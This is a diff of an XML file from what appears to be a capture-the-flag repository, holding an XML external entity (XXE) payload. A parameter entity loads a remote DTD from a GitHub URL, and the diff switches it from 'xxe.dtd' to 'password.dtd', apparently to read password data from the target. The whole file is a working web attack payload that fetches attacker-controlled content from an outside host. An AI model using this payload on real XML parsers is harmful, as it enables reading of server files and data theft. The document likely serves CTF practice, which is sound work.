@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <!DOCTYPE message [
-    <!ENTITY % ext SYSTEM "https://github.com/tgjarwl/ctf/blob/main/web/xxe/xxe.dtd">
+    <!ENTITY % ext SYSTEM "https://github.com/tgjarwl/ctf/blob/main/web/xxe/password.dtd">
     %ext;
 ]>
 <message></message>
